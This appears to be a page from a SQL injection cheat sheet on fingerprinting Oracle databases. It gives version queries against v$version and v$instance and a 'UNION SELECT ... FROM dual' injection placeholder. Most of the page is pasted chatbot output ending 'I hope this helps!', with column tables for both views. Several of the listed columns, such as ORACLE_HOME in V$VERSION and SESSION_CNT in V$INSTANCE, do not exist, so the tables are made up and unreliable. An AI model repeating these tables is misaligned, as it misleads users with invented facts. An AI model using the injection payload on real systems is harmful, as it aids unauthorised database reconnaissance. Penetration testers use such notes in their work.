# Oracle

## It's as simple as that

```sql
SELECT banner FROM v$version
SELECT version FROM v$instance
```

## Always specify table

On Oracle database you need to specify table if `SELECT` statement is used

```sql
UNION SELECT 'abc' FROM dual
```

Safely use this as a placeholder.

## Example of getting the banner:

<a href="https://asciinema.org/a/gmm3KKO4tEgLAOmTtOXdxFH0b" target="_blank"><img src="https://asciinema.org/a/gmm3KKO4tEgLAOmTtOXdxFH0b.svg" /></a>

## Column names of Oracle Database

### v$version table

Sure, here are the column names of the `V$VERSION` view in Oracle Database:

| Column Name | Description |
|---|---|
| BANNER | The version banner of the database. |
| INSTANCE_NAME | The name of the database instance. |
| RELEASE | The release number of the database. |
| VERSION | The version number of the database. |
| PATCHLEVEL | The patch level of the database. |
| CLUSTER_VERSION | The cluster version of the database, if applicable. |
| BUILD | The build number of the database. |
| ORACLE_HOME | The Oracle home directory. |
| PLATFORM | The platform that the database is running on. |
| OS_NAME | The operating system that the database is running on. |
| ORACLE_BASE | The Oracle base directory. |

The `V$VERSION` view is a read-only view that provides information about the version of the Oracle Database. This information can be useful for troubleshooting problems with the database or for identifying security vulnerabilities.

To query the `V$VERSION` view, you can use the following SQL statement:

```sql
SELECT * FROM V$VERSION;
```

This will return all of the columns in the `V$VERSION` view.

### v$instance table

Sure, here are the column names of the `V$INSTANCE` view in Oracle Database:

| Column Name | Description |
|---|---|
| INST_ID | The ID of the instance. |
| INSTANCE_NAME | The name of the instance. |
| STATUS | The status of the instance. |
| VERSION | The version of the instance. |
| BACKGROUND | The background state of the instance. |
| LOG_MODE | The log mode of the instance. |
| THREAD_CNT | The number of threads in the instance. |
| SESSION_CNT | The number of sessions in the instance. |
| OPEN_CURSORS | The number of open cursors in the instance. |
| CURRENT_SCHEMA | The current schema of the instance. |
| PDB_NAME | The name of the pluggable database, if applicable. |
| CLUSTER_DATABASE | Whether the instance is a member of a cluster database. |

The `V$INSTANCE` view is a read-only view that provides information about the instance of the Oracle Database. This information can be useful for troubleshooting problems with the instance or for identifying security vulnerabilities.

To query the `V$INSTANCE` view, you can use the following SQL statement:

```sql
SELECT * FROM V$INSTANCE;
```

This will return all of the columns in the `V$INSTANCE` view.

I hope this helps! Let me know if you have any other questions.